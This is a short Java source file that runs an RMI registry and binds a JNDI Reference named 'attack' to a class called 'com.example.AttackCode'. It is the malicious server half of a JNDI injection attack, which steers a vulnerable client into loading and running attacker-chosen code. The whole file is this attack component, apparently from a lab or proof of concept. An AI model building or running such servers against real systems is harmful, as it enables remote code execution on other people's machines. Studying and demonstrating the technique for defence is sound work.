package com.example;

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.UnicastRemoteObject;

import javax.naming.Reference;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

public class RMIServer {

    public static void main(String[] args) {
        try {
            LocateRegistry.createRegistry(1099);
            Registry registry = LocateRegistry.getRegistry();
            Reference reference = new Reference("com.example.AttackCode", "com.example.AttackCode", "com.example.AttackCode");
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
            registry.bind("attack", referenceWrapper);
            System.out.println("RMI server start");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}